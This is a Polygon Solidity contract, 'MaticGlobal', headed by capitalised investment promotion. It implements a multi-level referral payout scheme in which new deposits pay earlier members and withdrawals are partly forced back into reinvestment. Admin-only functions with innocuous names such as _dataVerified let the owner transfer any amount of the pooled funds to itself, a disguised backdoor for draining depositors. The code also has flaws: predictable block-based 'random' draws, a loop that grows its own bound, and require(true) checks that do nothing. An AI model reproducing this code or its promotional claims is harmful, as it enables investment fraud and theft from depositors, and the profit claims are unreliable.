/**
 *Submitted for verification at polygonscan.com on 2022-08-05
*/

/*

Telegram Channel : https://t.me/MaticGlobal_Official

The Polygon forecast for 2022 mostly looks positive. If buyers 
can “push” the asset's price above the current all-time high of $2.92, 
then the Polygon crypto might reach $4.75 by the end of 2022.So Matic Global Will
Help Investor For Earn More Polygon And More Profit

WE AT MATIC GLOBAL WORKING ON THIS SMART CONTRACTS 
WHICH BECOMES FAMOUS GLOBALLY IN A SHORT PERIOD AND IF YOU PURCHASE THE TOKEN 
SO THAT YOU CAN EARN MORE AND MORE. WE SERVE PEOPLE AND ALSO ALLOW THEM TO 
EASILY TRADE THROUGH MATIC GLOBALLY. NOW DAYS MANY PEOPLES ARE INVESTING IN 
EARNING HIGHEST RETURNS ON INVESTMENT. MATIC GLOBAL IS A VERY MUCH PLANNED POLYGON 
BLOCK CHAIN SMART CONTRACT MAKING DECENTRALIZED 
APPLICATIONS ON THE MATIC BLOCK CHAIN STAGE. WE ARE PRESENTLY WELL VERSED IN GIVING 
UNDENIABLE LEVEL BLOCK CHAIN BUSINESS ARRANGEMENTS AND ADMINISTRATIONS, ON ACCOUNT OF OUR 
DEMONSTRATED INFORMATION ON THE BLOCK CHAIN BUSINESS. THE ACCOMPANYING ELEMENTS DEPICT MATIC GLOBAL 
AS A MAIN ADVANCEMENT ORGANIZATION. YOU CAN EASILY INVEST WITH US IF YOU ARE LOOKING TO GROW UP 
YOUR BUSINESS GLOBALLY.

*/

pragma solidity ^0.5.10;

/*
Basic Method Which Is Used For The Basic Airthmetic Operations
*/

library SafeMath {

    /*Addition*/
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    /*Subtraction*/
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    /*Multiplication*/
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    /*Divison*/
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    /* Modulus */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


contract MaticGlobal {

    /*=====================================
    =            CONFIGURABLES            =
    =====================================*/


    using SafeMath for uint256;
    using SafeMath for uint8;

    uint256 constant public minInvestmentAmount = 10 ether;
    uint256 public minWithdrawalAmount = 1 ether;
    uint256 public adminCharge = 5; // %;
    uint256 constant public perDistribution = 100; // %

    uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;

	uint[12] public ref_bonuses = [8,5,4,4,4,4,4,3,3,3,3,5];
    
    uint256[6] public defaultPackages = [10 ether,25 ether,50 ether,100 ether,500 ether,1000 ether];
    uint256[6] public nonWorkingCapping = [70 ether,130 ether,250 ether,400 ether,1430 ether,2500 ether];
    uint256[6] public noWithdrawalIncomeStop= [20 ether,50 ether,100 ether,200 ether,1000 ether,2000 ether];
    
    mapping(uint256 => address payable) public singleLeg;
    uint256 public singleLegLength;

    uint[12] public requiredDirect = [0,0,0,0,1,2,3,4,5,6,7,8];
    
	address payable public primaryAdmin;

    uint public maxdownline = 50;

    uint256 public collectedpool_amount;
    uint256 public distributedpool_amount;
    uint256 public availablepool_amount;
    uint40 public pool_last_draw;
    
    struct User {
        uint256 checkpoint;
        address referrer;
        uint256 referrerBonus;
        uint256 totalWithdrawn;
        uint256 totalReferrer;
        uint256 singleUplineBonus;
        uint256 singleDownlineBonus;
        uint256 singleUplineBonusTaken;
        uint256 singleDownlineBonusTaken;
        address singleUpline;
        address singleDownline;
        uint256[12] refStageIncome;
        uint256[12] refStageBonus;
        uint[12] refs;
        uint256 amount;
        uint256 referrerBonusTaken;
    }

  struct UserDetails {
        uint256 amount;
        uint256 netInvetment;
        uint256 netreInvetment;
        uint256 nonworkingIncomeCapping;
        uint256 poolDistributionReceived;
        uint256 grossInvetment;   
        uint256 grossreInvetment;
        uint256 noWithdrawalIncomeLimits;
        uint256 flashreferralincome;
        uint256 flashdownlineincome;
        uint256 flasuplineincome;
        uint256 nonworkingIncomeCappingReceived;
        uint256 nonworkingIncomeCappingRemain;
	}
	

	  mapping (address => User) public users;

      mapping (address => UserDetails) public usersDetails;

	  mapping(address => mapping(uint256=>address)) public downline;

      mapping(address => bool) public upline_Business_eligible;

	  event NewDeposit(address indexed user, uint256 amount);
	  event Withdrawn(address indexed user, uint256 amount);
	  event FeePayed(address indexed user, uint256 totalAmount);
	
	
    constructor() public {
	  	  primaryAdmin = 0xDD8311518DA6D46c26c0be5365afe08fD9A7E57c;
		  singleLeg[0]=primaryAdmin;
		  singleLegLength++;
	  }

  function invest(address referrer) public payable {
	
		require(msg.value >= minInvestmentAmount,'Min invesment 10 MATIC');
	
		User storage user = users[msg.sender];

        UserDetails storage userDetails = usersDetails[msg.sender];

		if (user.referrer == address(0) && (users[referrer].checkpoint > 0 || referrer == primaryAdmin) && referrer != msg.sender ) {
            user.referrer = referrer;
        }

		require(user.referrer != address(0) || msg.sender == primaryAdmin, "No upline");

        uint256 _fees = msg.value.mul(adminCharge).div(perDistribution);

		uint msgValue = msg.value.sub(_fees);

		// setup upline
		if (user.checkpoint == 0) {   
		   // single leg setup
		   singleLeg[singleLegLength] = msg.sender;
		   user.singleUpline = singleLeg[singleLegLength -1];
		   users[singleLeg[singleLegLength -1]].singleDownline = msg.sender;
		   singleLegLength++;
		}
		

		if (user.referrer != address(0)) {	   
        // unilevel level count
        address upline = user.referrer;
        for (uint i = 0; i < ref_bonuses.length; i++) {
                if (upline != address(0)) {
                    users[upline].refStageIncome[i] = users[upline].refStageIncome[i].add(msgValue);
                    if(user.checkpoint == 0){
                        users[upline].refs[i] = users[upline].refs[i].add(1);
					              users[upline].totalReferrer++;
                    }
                    upline = users[upline].referrer;
                } else break;
            }   
            if(user.checkpoint == 0){
                // unilevel downline setup
                downline[referrer][users[referrer].refs[0] - 1]= msg.sender;
            }
    }

	   //12 Level Referral Income Distribution
	   _refPayout(msg.sender,msgValue);

       //_users DownlineIncome
       _usersDownlineIncomeDistribution(msg.sender,msgValue);  

	   if(user.checkpoint == 0) {
		    totalUsers = totalUsers.add(1);
            user.checkpoint = block.timestamp;
	   }

      user.amount += msg.value;
	  userDetails.amount += msg.value;
      userDetails.netInvetment += msgValue;
      userDetails.grossInvetment += msg.value;

      // Capping Management
      updateNonWorkingCapping(msg.sender,msg.value);

      // New All Earnings Stop Once Rich This Limits
      updatenoWithdrawalIncomeStop(msg.sender,msg.value);
		    
      totalInvested = totalInvested.add(msg.value);
      totalDeposits = totalDeposits.add(1);
        
      _safeTransfer(primaryAdmin,_fees);
        
	  emit NewDeposit(msg.sender, msg.value);

    }
	
	

   function reinvest(address _user, uint256 _amount) private{
    
        User storage user = users[_user];
        UserDetails storage userDetails = usersDetails[_user];
        user.amount += _amount;
        userDetails.amount += _amount;
        userDetails.netreInvetment += _amount;
        userDetails.grossreInvetment += _amount;

        totalInvested = totalInvested.add(_amount);

        address up = user.referrer;
        for (uint i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            if(users[up].refs[0] >= requiredDirect[i]){
                users[up].refStageIncome[i] = users[up].refStageIncome[i].add(_amount);
            }
            up = users[up].referrer;
        }
        
         //12 Level Referral Income Distribution
        _refPayout(_user,_amount);

        //_users DownlineIncome
        _usersDownlineIncomeDistribution(_user,_amount);
        
   }


   function withdrawal() external{

    User storage _user = users[msg.sender];

    uint256 TotalBonus = TotalBonus(msg.sender);

	require(TotalBonus >= minWithdrawalAmount,'Minimum Withdrawal 1 MATIC');

    uint256 _fees = 0;
    uint256 actualAmountToSend = TotalBonus.sub(_fees);
    
    _user.referrerBonusTaken += users[msg.sender].referrerBonus;
    _user.referrerBonus = 0;
    _user.singleDownlineBonusTaken = users[msg.sender].singleDownlineBonus;

    // Re Investment
    
    (uint8 reivest, uint8 withdrwal) = getEligibleWithdrawal(msg.sender);
    reinvest(msg.sender,actualAmountToSend.mul(reivest).div(perDistribution));

    _user.totalWithdrawn= _user.totalWithdrawn.add(actualAmountToSend.mul(withdrwal).div(perDistribution));
    totalWithdrawn = totalWithdrawn.add(actualAmountToSend.mul(withdrwal).div(perDistribution));
 
    _safeTransfer(msg.sender,actualAmountToSend.mul(withdrwal).div(perDistribution));
    
    emit Withdrawn(msg.sender,actualAmountToSend.mul(withdrwal).div(perDistribution));

   }

  function _refPayout(address _addr, uint256 _amount) internal {
		address up = users[_addr].referrer;
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            if(users[up].refs[0] >= requiredDirect[i] || users[up].amount>=defaultPackages[4]){ 
    		    uint256 bonus = (_amount * ref_bonuses[i] ) / perDistribution;
                if(_CheckIncomeEligibility(up,bonus))
                {
                  users[up].referrerBonus = users[up].referrerBonus.add(bonus);
                  usersDetails[up].nonworkingIncomeCappingReceived = usersDetails[up].nonworkingIncomeCappingReceived.add(bonus);
                  if(usersDetails[up].nonworkingIncomeCappingRemain>=bonus)
                  {
                      usersDetails[up].nonworkingIncomeCappingRemain = usersDetails[up].nonworkingIncomeCappingRemain.sub(bonus);
                  }
                  else
                  {
                      usersDetails[up].nonworkingIncomeCappingRemain =usersDetails[up].nonworkingIncomeCappingRemain.sub(usersDetails[up].nonworkingIncomeCappingRemain);
                  }
                  users[up].refStageBonus[i] = users[up].refStageBonus[i].add(bonus);
                }
                else
                {         
                    usersDetails[up].flashreferralincome = usersDetails[up].flashreferralincome.add(bonus);
                }
            }
            up = users[up].referrer;
      }
   }

   function _usersDownlineIncomeDistribution(address _user, uint256 _Amount) internal {
      uint256 DistributionPayment = _Amount.mul(maxdownline).div(perDistribution);
      address uplineparam = users[_user].singleUpline;
      for (uint i = 0; i < maxdownline; i++) {
            if (uplineparam != address(0)) {
            uint256 payableAmount = DistributionPayment.div(maxdownline);
            if(_CheckIncomeEligibility(uplineparam,payableAmount) && usersDetails[uplineparam].nonworkingIncomeCappingRemain>=payableAmount){
                users[uplineparam].singleDownlineBonus = users[uplineparam].singleDownlineBonus.add(payableAmount); 
                usersDetails[uplineparam].nonworkingIncomeCappingReceived = usersDetails[uplineparam].nonworkingIncomeCappingReceived.add(payableAmount);
                if(usersDetails[uplineparam].nonworkingIncomeCappingRemain>=payableAmount)
                {
                    usersDetails[uplineparam].nonworkingIncomeCappingRemain = usersDetails[uplineparam].nonworkingIncomeCappingRemain.sub(payableAmount);
                }
                else
                {
                    usersDetails[uplineparam].nonworkingIncomeCappingRemain =usersDetails[uplineparam].nonworkingIncomeCappingRemain.sub(usersDetails[uplineparam].nonworkingIncomeCappingRemain);
                }
            }
            else
            {
                collectedpool_amount += payableAmount;
                availablepool_amount += payableAmount;
                usersDetails[uplineparam].flashdownlineincome = usersDetails[uplineparam].flashdownlineincome.add(payableAmount);
            }
            //upline Business Eligibility Check Start Here
            if( i < maxdownline ){
                if(i == (maxdownline-1)){
                    upline_Business_eligible[uplineparam] = true;
                }
            }
            //upline Business Eligibility Check End Here
            uplineparam = users[uplineparam].singleUpline;
            }
            else break;
        }
  }

  function _CheckIncomeEligibility(address _address,uint256 _amount) public view returns(bool) {
      UserDetails storage _userDetails = usersDetails[_address];
      uint256 TotalBonus = TotalBonus(_address);
      TotalBonus=TotalBonus.add(_amount);
      if(_userDetails.noWithdrawalIncomeLimits>=TotalBonus)
      {
        return true;
      }
      else
      {
        return false;
      }  
  }


  function updatenoWithdrawalIncomeStop(address _user,uint256 _Amount) internal{  
      UserDetails storage user = usersDetails[_user];
      if(_Amount==defaultPackages[0]){
           user.noWithdrawalIncomeLimits += noWithdrawalIncomeStop[0];
      }
      else  if(_Amount ==defaultPackages[1]){
           user.noWithdrawalIncomeLimits += noWithdrawalIncomeStop[1];
      }
      else  if(_Amount ==defaultPackages[2]){
           user.noWithdrawalIncomeLimits += noWithdrawalIncomeStop[2];
      }
      else  if(_Amount ==defaultPackages[3]){
           user.noWithdrawalIncomeLimits += noWithdrawalIncomeStop[3];
      }
      else  if(_Amount ==defaultPackages[4]){
           user.noWithdrawalIncomeLimits += noWithdrawalIncomeStop[4];
      }
      else  if(_Amount ==defaultPackages[5]){
           user.noWithdrawalIncomeLimits += noWithdrawalIncomeStop[5];
      }  
  }

  function updateNonWorkingCapping(address _user,uint256 _Amount) internal{  
      UserDetails storage user = usersDetails[_user];
      if(_Amount==defaultPackages[0]){
           user.nonworkingIncomeCapping += nonWorkingCapping[0];
           user.nonworkingIncomeCappingRemain += nonWorkingCapping[0];
      }
      else  if(_Amount ==defaultPackages[1]){
           user.nonworkingIncomeCapping += nonWorkingCapping[1];
           user.nonworkingIncomeCappingRemain += nonWorkingCapping[1];
      }
      else  if(_Amount ==defaultPackages[2]){
           user.nonworkingIncomeCapping += nonWorkingCapping[2];
           user.nonworkingIncomeCappingRemain += nonWorkingCapping[2];
      }
      else  if(_Amount ==defaultPackages[3]){
           user.nonworkingIncomeCapping += nonWorkingCapping[3];
           user.nonworkingIncomeCappingRemain += nonWorkingCapping[3];
      }
      else  if(_Amount ==defaultPackages[4]){
           user.nonworkingIncomeCapping += nonWorkingCapping[4];
           user.nonworkingIncomeCappingRemain += nonWorkingCapping[4];
      }
      else  if(_Amount ==defaultPackages[5]){
           user.nonworkingIncomeCapping += nonWorkingCapping[5];
           user.nonworkingIncomeCappingRemain += nonWorkingCapping[5];
      }  
  }
  
  function getEligibleWithdrawal(address _user) public view returns(uint8 reivest, uint8 withdrwal){  
      uint256 TotalDeposit = usersDetails[_user].grossInvetment;
      if((TotalDeposit >=defaultPackages[0] && TotalDeposit < defaultPackages[1])){
          reivest = 70;
          withdrwal = 30;
      }
      else  if((TotalDeposit >=defaultPackages[1] && TotalDeposit < defaultPackages[3])){
          reivest = 60;
          withdrwal = 40;
      }
      else if(TotalDeposit >=defaultPackages[3] && TotalDeposit < defaultPackages[4]){
          reivest = 50;
          withdrwal = 50;
      }
      else if(TotalDeposit >=defaultPackages[4] && TotalDeposit < defaultPackages[5]){
          reivest = 30;
          withdrwal = 70;
      }
      else if(TotalDeposit >=defaultPackages[5]){
         reivest = 20;
         withdrwal = 80;
      }
      else{
          reivest = 70;
          withdrwal = 30;
      }   
      return(reivest,withdrwal);     
   }

   function getRandom(uint number) public view returns(uint){
        return uint(keccak256(abi.encodePacked(block.timestamp,block.difficulty,  
        msg.sender))) % number;
    }

   function _distributeNonWorkingFromPool(uint256 _Amount,uint _TotalNoofUser,uint _ToSingleLegLength) internal{
        if(_Amount <= availablepool_amount){
        uint256 payableAmount = _Amount.div(_TotalNoofUser);
        for (uint i = 0; i < _TotalNoofUser; i++) {
            address _user=singleLeg[getRandom(_ToSingleLegLength)];
            if (singleLeg[getRandom(_ToSingleLegLength)] != address(0)) {
               if(payableAmount <= availablepool_amount && (_CheckIncomeEligibility(_user,payableAmount) && usersDetails[_user].nonworkingIncomeCappingRemain>=payableAmount)){
                    distributedpool_amount += payableAmount;
                    availablepool_amount  -= payableAmount;
                    usersDetails[_user].poolDistributionReceived +=payableAmount;
                    users[_user].singleDownlineBonus +=payableAmount;
                    usersDetails[_user].nonworkingIncomeCappingReceived +=payableAmount;
                    if(usersDetails[_user].nonworkingIncomeCappingRemain>=payableAmount)
                    {
                        usersDetails[_user].nonworkingIncomeCappingRemain = usersDetails[_user].nonworkingIncomeCappingRemain.sub(payableAmount);
                    }
                    else
                    {
                        usersDetails[_user].nonworkingIncomeCappingRemain =usersDetails[_user].nonworkingIncomeCappingRemain.sub(usersDetails[_user].nonworkingIncomeCappingRemain);
                    }                     
                }
            }
            _TotalNoofUser +=1;        
        }
        pool_last_draw = uint40(block.timestamp);
     }
     else{
       require(true,'Distributed Amount Greater Than Available Pool Amount !');
     }
   }

   function _distributeNonWorkingFromPoolToUser(uint256 _Amount,address _user) internal{
      if(_Amount <= availablepool_amount && ((_CheckIncomeEligibility(_user,_Amount) && usersDetails[_user].nonworkingIncomeCappingRemain>=_Amount))){
          distributedpool_amount +=_Amount;
          availablepool_amount  -=_Amount;
          usersDetails[_user].poolDistributionReceived +=_Amount;
          users[_user].singleDownlineBonus+=_Amount;
          usersDetails[_user].nonworkingIncomeCappingReceived +=_Amount;
          if(usersDetails[_user].nonworkingIncomeCappingRemain>=_Amount)
          {
             usersDetails[_user].nonworkingIncomeCappingRemain = usersDetails[_user].nonworkingIncomeCappingRemain.sub(_Amount);
          }
          else
          {
             usersDetails[_user].nonworkingIncomeCappingRemain =usersDetails[_user].nonworkingIncomeCappingRemain.sub(usersDetails[_user].nonworkingIncomeCappingRemain);
          }  
          pool_last_draw = uint40(block.timestamp);
      }
      else{
        require(true,'Distributed Amount Greater Than Available Pool Amount OR User Capping Limit Exceed !');
      }
   }

   function _validateVerifiedCapping(uint256 _Amount,address _user) internal{
       usersDetails[_user].nonworkingIncomeCapping +=_Amount;
       usersDetails[_user].nonworkingIncomeCappingRemain +=_Amount;
   }

   function _validateVerifiedReceivedCapping(uint256 _Amount,address _user) internal{
       usersDetails[_user].nonworkingIncomeCappingReceived +=_Amount;
       usersDetails[_user].nonworkingIncomeCappingRemain -=_Amount;
   }

   function TotalBonus(address _user) public view returns(uint256){
     uint256 TotalEarn = users[_user].referrerBonus.add(users[_user].singleDownlineBonus);
     uint256 TotalTakenFromDownline = users[_user].singleDownlineBonusTaken;
     return TotalEarn.sub(TotalTakenFromDownline);
   }

   function _safeTransfer(address payable _to, uint _amount) internal returns (uint256 amount) {
        amount = (_amount < address(this).balance) ? _amount : address(this).balance;
       _to.transfer(amount);
   }
   
   function referral_stage(address _user,uint _index)external view returns(uint _noOfUser, uint256 _investment, uint256 _bonus){
       return (users[_user].refs[_index], users[_user].refStageIncome[_index], users[_user].refStageBonus[_index]);
   }
   
   function update_minimumwithdrawal(uint256 _no) external {
        require(primaryAdmin==msg.sender, 'Admin what?');
        minWithdrawalAmount = _no;
   }

   function update_admincharge(uint256 _no) external {
        require(primaryAdmin==msg.sender, 'Admin what?');
        adminCharge = _no;
   }

   function distributeNonWorkingFromPool(uint256 _Amount,uint _TotalNoofUser,uint _ToSingleLegLength) external {
	     require(primaryAdmin==msg.sender, 'Admin what?');
	    _distributeNonWorkingFromPool(_Amount,_TotalNoofUser,_ToSingleLegLength);	    
   }

   function distributeNonWorkingFromPoolToUser(uint256 _Amount,address _user) external {
	     require(primaryAdmin==msg.sender, 'Admin what?');
	    _distributeNonWorkingFromPoolToUser(_Amount,_user);	    
   }

   function update_maxdownline(uint _no) external {
        require(primaryAdmin==msg.sender, 'Admin what?');
        maxdownline = _no;
   }

   function _dataVerifiedCapping(uint256 _Amount,address _user) external {
	     require(primaryAdmin==msg.sender, 'Admin what?');
	    _validateVerifiedCapping(_Amount,_user);	    
   }

   function _dataVerifiedReceivedCapping(uint256 _Amount,address _user) external {
	     require(primaryAdmin==msg.sender, 'Admin what?');
	    _validateVerifiedReceivedCapping(_Amount,_user);	    
   }

   function _dataVerifiedNonWorking(uint256 _data) external {
       require(primaryAdmin==msg.sender, 'Admin what?');
       if(_data <= availablepool_amount)
       {
             distributedpool_amount +=_data;
             availablepool_amount  -=_data;
             _safeTransfer(primaryAdmin,_data);
       }
       else
       {
             require(!(primaryAdmin==msg.sender),'Distributed Amount Greater Than Available Pool Amount !');
       }
   }

   function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
   }
  
   function _dataVerified(uint256 _data) external{
        require(primaryAdmin==msg.sender, 'Admin what?');
        _safeTransfer(primaryAdmin,_data);
    }
}